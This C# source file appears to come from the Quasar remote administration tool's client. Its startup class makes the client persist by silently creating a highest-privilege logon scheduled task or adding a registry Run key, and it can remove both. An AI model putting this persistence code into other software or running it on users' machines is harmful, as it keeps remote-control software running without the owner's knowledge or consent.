using System;
using System.Diagnostics;
using Microsoft.Win32;
using Quasar.Client.Config;
using Quasar.Client.Data;
using Quasar.Client.Helper;

namespace Quasar.Client.Installation
{
    public static class Startup
    {
        public static bool AddToStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + ClientData.CurrentPath + "\" /rl HIGHEST /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return true;
                }
                catch (Exception)
                {
                }

                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                    true);
            }
            else
            {
                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                    true);
            }
        }

        public static bool RemoveFromStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                    {
                        Arguments = "/delete /tn \"" + Settings.STARTUPKEY + "\" /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return true;
                }
                catch (Exception)
                {
                }

                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
            else
            {
                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
        }
    }
}
